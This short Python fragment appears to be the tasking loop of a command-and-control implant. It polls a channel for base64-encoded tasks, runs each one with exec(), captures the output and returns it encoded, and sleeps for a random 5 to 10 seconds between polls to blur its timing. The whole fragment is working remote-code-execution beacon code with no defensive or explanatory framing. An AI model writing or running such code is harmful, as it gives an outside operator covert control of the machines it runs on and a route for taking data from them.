Channel.initalization()

while True:
	data = Channel.get_task()
	if data.decode() != "":
		print(data)
		task_id,task = data.decode().split(':')
		task = base64.b64decode(task).decode()
		f = io.StringIO()
		with contextlib.redirect_stdout(f):
			exec(task)
		output = f.getvalue()
		if output == "":
			output = 'Output returned Null'
		output = output.encode()
		outputid = task_id + ":" + base64.b64encode(output).decode()
		Channel.task_io(bytes(outputid, 'utf-8'))
		time.sleep(random.randint(5,10))
	else:
		time.sleep(random.randint(5,10))
		continue
